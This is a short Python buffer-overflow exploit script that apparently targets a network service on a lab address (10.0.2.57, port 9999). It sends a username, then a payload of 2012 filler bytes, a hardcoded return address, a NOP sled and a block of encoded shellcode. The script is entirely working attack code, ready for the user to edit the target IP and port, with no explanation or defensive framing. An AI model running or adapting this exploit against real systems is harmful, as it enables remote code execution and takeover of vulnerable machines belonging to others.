import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 9999		# Change this

prefix = b''
buffer = b'A' * 2012
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xbf\xd7\xf5\x76\x53\xdd\xc6\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x31\x83\xc0\x04\x31\x78\x0f"
shellcode += b"\x03\x78\xd8\x17\x83\xaf\x0e\x55\x6c\x50\xce"
shellcode += b"\x3a\xe4\xb5\xff\x7a\x92\xbe\xaf\x4a\xd0\x93"
shellcode += b"\x43\x20\xb4\x07\xd0\x44\x11\x27\x51\xe2\x47"
shellcode += b"\x06\x62\x5f\xbb\x09\xe0\xa2\xe8\xe9\xd9\x6c"
shellcode += b"\xfd\xe8\x1e\x90\x0c\xb8\xf7\xde\xa3\x2d\x7c"
shellcode += b"\xaa\x7f\xc5\xce\x3a\xf8\x3a\x86\x3d\x29\xed"
shellcode += b"\x9d\x67\xe9\x0f\x72\x1c\xa0\x17\x97\x19\x7a"
shellcode += b"\xa3\x63\xd5\x7d\x65\xba\x16\xd1\x48\x73\xe5"
shellcode += b"\x2b\x8c\xb3\x16\x5e\xe4\xc0\xab\x59\x33\xbb"
shellcode += b"\x77\xef\xa0\x1b\xf3\x57\x0d\x9a\xd0\x0e\xc6"
shellcode += b"\x90\x9d\x45\x80\xb4\x20\x89\xba\xc0\xa9\x2c"
shellcode += b"\x6d\x41\xe9\x0a\xa9\x0a\xa9\x33\xe8\xf6\x1c"
shellcode += b"\x4b\xea\x59\xc0\xe9\x60\x77\x15\x80\x2a\x1d"
shellcode += b"\xe8\x16\x51\x53\xea\x28\x5a\xc3\x83\x19\xd1"
shellcode += b"\x8c\xd4\xa5\x30\xe9\x3b\x44\x91\x07\xd4\xd1"
shellcode += b"\x70\xaa\xb9\xe1\xae\xe8\xc7\x61\x5b\x90\x33"
shellcode += b"\x79\x2e\x95\x78\x3d\xc2\xe7\x11\xa8\xe4\x54"
shellcode += b"\x11\xf9\x86\x3b\x81\x61\x67\xde\x21\x03\x77"


payload = prefix + buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending username')
        s.send(b'nop\n')
        s.recv(1024)
        print('Sending payload')
        s.send(payload + b'\n')
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
